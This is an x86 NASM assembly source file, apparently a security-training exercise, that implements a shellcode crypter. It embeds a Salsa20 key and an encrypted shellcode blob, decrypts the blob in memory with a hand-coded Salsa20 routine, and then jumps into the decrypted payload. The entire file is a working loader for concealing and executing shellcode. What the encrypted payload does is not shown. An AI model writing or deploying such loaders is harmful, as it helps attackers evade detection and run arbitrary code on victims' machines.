; Filename: salsa20_decrypter.nasm
; Author:  Mark Shaneck
; Website:  http://markshaneck.com
;
; Purpose: Decrypt salsa20 

global _start

section .text
_start:
    jmp short key

got_key:
    pop esi   ; key is now in esi
    jmp short decrypt_shellcode

key:
    call got_key
    keydata: dd 0x61707865, 0x31313131, 0x32323232, 0x33333333,\
                0x34343434, 0x3320646e, 0x41414141, 0x42424242,\
                0x43434343, 0x44444444, 0x79622d32, 0x35353535,\
                0x36363636, 0x37373737, 0x38383838, 0x6b206574
    align 4
    ; needed these for alignment, since it was getting confused about where instructions started
    nop
    nop 
    nop
    nop
    nop
    nop

decrypt_shellcode:
    jmp short shellcode

got_shellcode:
    pop edi
    xor edx,edx
    mov dx, 0x65 ; I have to hard code the length here, since the assembler tried to fill out the instructions apparently, but it's ok, as I am generating the code dynamically
    push edx
    push edi
    push esi
    nop
    nop
    nop
    nop
    call decrypt
    nop   
    nop
    nop
    nop    
    ; shellcode should be decrypted and in edi
    call edi
     
    nop
    nop
    nop
    nop

shellcode:
    call got_shellcode
    encrypted_shellcode: db 0xb4,0x7e,0x80,0x03,0x8f,0x6d,0xbe,0x43,0xe7,0xed,0x2b,0x6a,0x40,0x42,0xf3,0x15,0xad,0xec,0x5b,0x42,0xdd,0xc2,0xc4,0xd0,0x4b,0x94,0x57,0xfd,0x0b,0xd7,0x57,0x71,0xbf,0x23,0xb9,0xc0,0x33,0x62,0xaa,0x70,0x34,0x12,0x35,0xd8,0x49,0xff,0x89,0x93,0x21,0xa8,0xb3,0x77,0xbb,0x86,0x8b,0x09,0xba,0xd7,0x8e,0x3b,0x7b,0x4a,0x71,0xb9,0xad,0x46,0x9f,0xcf,0x76,0xd3,0xea,0x5d,0xdb,0xe8,0xed,0x93,0xfa,0xa9,0xef,0xaf,0x41,0x84,0xdf,0xa1,0xf8,0x10,0x5f,0x48,0x2c,0x0d,0x24,0xec,0x74,0x50,0x3a,0xc5,0xef,0xd7,0x46,0x08,0x9f

    ; more alignment operations
    nop
    nop
    nop
    nop
    nop
    nop
    nop

decrypt:
    ; assume that key/state is in ebp+8
    ; assume that message is in ebp+12
    ; assume that messageLength is in ebp+16    

    push ebp
    mov ebp,esp  
    push eax
    push ebx
    push ecx
    push edx

    mov esi, [ebp+8]   ; state
    mov edi, [ebp+12]  ; message

    xor eax,eax ; eax will be the offset into the message
    xor ebx,ebx
    decrypt_block:
        push esi
        call salsa20Core
        add esp,4

        mov ebx, [esi+32]
        inc ebx
        mov [esi+32],ebx
        cmp ebx,0
        jne after_counter
            mov ebx, [esi+36]
            inc ebx
            mov [esi+36],ebx

        after_counter:
        mov ebx, [ebp+16] ; this is how much is left
        cmp bx,64
        jge set_to_64
            ; partial block left, only xor what we need to
            mov ecx,ebx
            jmp short continue_decrypt

        set_to_64:
        xor ecx,ecx
        mov cx,64

        continue_decrypt:
 
        push eax ; save block number
        push ecx ; save whatever the length of the block is 

        shl eax, 6 ; eax is now the byte offset into the current block

        xor_block:
            mov edx,eax ; now edx is block offset
            add edx,ecx ; now edx is current byte offset
            xor ebx,ebx
            mov bl, byte [edi+edx-1]
            xor bl, byte [esi+ecx-1]
            mov byte [edi+edx-1], bl
            loop xor_block

        pop ecx
        pop eax
        inc eax ; processed another block
        mov ebx, [ebp+16]
        sub ebx,ecx
        mov [ebp+16],ebx
        cmp ebx, 0
        jg decrypt_block

    ; all done
    pop edx
    pop ecx
    pop ebx
    pop eax
    leave 
    ret


salsa20Core:
    push ebp
    mov ebp,esp  

    ; address of original state structure is in ebp+8
    push eax
    push ebx
    push ecx
    push edx
    sub esp,64  ; esp points to base of temp state structure
    xor ecx,ecx
    mov cl,15
    mov eax,[ebp+8] ; address of original is in eax
    
    ; copy original into temp
    salsa20CoreCopyLoop:
        mov ebx,[eax+ecx*4]
        mov [esp+ecx*4],ebx
        dec ecx
        cmp cl,0xff
        jne salsa20CoreCopyLoop

    xor ecx, ecx
    mov cl,9
    push esp
    salsa20CoreRoundLoop:
        call salsa20CoreRound
        dec ecx
        cmp cl,0xff
        jne salsa20CoreRoundLoop
    
    add esp,4

    xor ecx,ecx
    mov cl,15
    salsa20CoreAddLoop:
        mov ebx,[esp+ecx*4]
        mov edx,[eax+ecx*4] 
        add edx,ebx
        mov [eax+ecx*4],edx
        dec ecx
        cmp cl,0xff
        jne salsa20CoreAddLoop

    add esp,64
    pop edx
    pop ecx
    pop ebx
    pop eax

    leave 
    ret


salsa20CoreRound:
    push ebp
    mov ebp,esp
    ; call all the xor-rotate-add functions
    ; require base of structure in ebp+8
    push eax
    push ebx
    xor ebx,ebx
    mov eax,[ebp+8]
    push eax ; push address of structure on stack and leave it there

    push 7
    push 12    
    push ebx
    push 4
    call salsa20CoreRoundFunction
    add esp,16

    push 9
    push ebx
    push 4
    push 8
    call salsa20CoreRoundFunction
    add esp,16

    push 13
    push 4
    push 8
    push 12
    call salsa20CoreRoundFunction
    add esp,16

    push 18
    push 8
    push 12
    push ebx
    call salsa20CoreRoundFunction
    add esp,16

    push 7
    push 1
    push 5
    push 9
    call salsa20CoreRoundFunction
    add esp,16

    push 9
    push 5
    push 9
    push 13
    call salsa20CoreRoundFunction
    add esp,16

    push 13
    push 9
    push 13
    push 1
    call salsa20CoreRoundFunction
    add esp,16

    push 18
    push 13
    push 1
    push 5
    call salsa20CoreRoundFunction
    add esp,16

    push 7
    push 6
    push 10
    push 14
    call salsa20CoreRoundFunction
    add esp,16

    push 9
    push 10
    push 14
    push 2
    call salsa20CoreRoundFunction
    add esp,16

    push 13
    push 14
    push 2
    push 6
    call salsa20CoreRoundFunction
    add esp,16

    push 18
    push 2
    push 6
    push 10
    call salsa20CoreRoundFunction
    add esp,16

    push 7
    push 11
    push 15
    push 3
    call salsa20CoreRoundFunction
    add esp,16

    push 9
    push 15
    push 3
    push 7
    call salsa20CoreRoundFunction
    add esp,16

    push 13
    push 3
    push 7
    push 11
    call salsa20CoreRoundFunction
    add esp,16

    push 18
    push 7
    push 11
    push 15
    call salsa20CoreRoundFunction
    add esp,16

    push 7
    push 3
    push ebx
    push 1
    call salsa20CoreRoundFunction
    add esp,16

    push 9
    push ebx
    push 1
    push 2
    call salsa20CoreRoundFunction
    add esp,16

    push 13
    push 1
    push 2
    push 3
    call salsa20CoreRoundFunction
    add esp,16

    push 18
    push 2
    push 3
    push ebx
    call salsa20CoreRoundFunction
    add esp,16

    push 7
    push 4
    push 5
    push 6
    call salsa20CoreRoundFunction
    add esp,16

    push 9
    push 5
    push 6
    push 7
    call salsa20CoreRoundFunction
    add esp,16

    push 13
    push 6
    push 7
    push 4
    call salsa20CoreRoundFunction
    add esp,16

    push 18
    push 7
    push 4
    push 5
    call salsa20CoreRoundFunction
    add esp,16

    push 7
    push 9
    push 10
    push 11
    call salsa20CoreRoundFunction
    add esp,16

    push 9
    push 10
    push 11
    push 8
    call salsa20CoreRoundFunction
    add esp,16

    push 13
    push 11
    push 8 
    push 9
    call salsa20CoreRoundFunction
    add esp,16

    push 18
    push 8
    push 9
    push 10
    call salsa20CoreRoundFunction
    add esp,16

    push 7
    push 14
    push 15
    push 12
    call salsa20CoreRoundFunction
    add esp,16

    push 9
    push 15
    push 12
    push 13
    call salsa20CoreRoundFunction
    add esp,16

    push 13
    push 12
    push 13
    push 14
    call salsa20CoreRoundFunction
    add esp,16

    push 18
    push 13
    push 14
    push 15
    call salsa20CoreRoundFunction
    add esp,16

    
    add esp,4
    pop ebx
    pop eax


    leave 
    ret

salsa20CoreRoundFunction:
    ; perform a single xor rotate add
    ; target offset stored in ebp+8
    ; source 1 offset stored in ebp+12
    ; source 2 offset stored in ebp+16
    ; shift offset stored in ebp+20
    ; base of structure stored in ebp+24
    push ebp
    mov ebp,esp
    push eax
    push ebx
    push ecx
    mov ebx,[ebp+12] ; source 1 offset moved into ebx
    mov eax,[ebp+24] ; base address in eax
    mov ebx,[eax+ebx*4] ; x[source1] in ebx
    mov ecx,[ebp+16]
    mov ecx,[eax+ecx*4] ; x[source2] in ecx
    add ebx,ecx
    mov ecx,[ebp+20]
    rol ebx,cl
    mov ecx,[ebp+8] ; target offset
    mov ecx,[eax+ecx*4] ; x[target] in ecx
    xor ebx,ecx
    mov ecx,[ebp+8]
    mov [eax+ecx*4],ebx
    pop ecx
    pop ebx
    pop eax
    leave
    ret
     
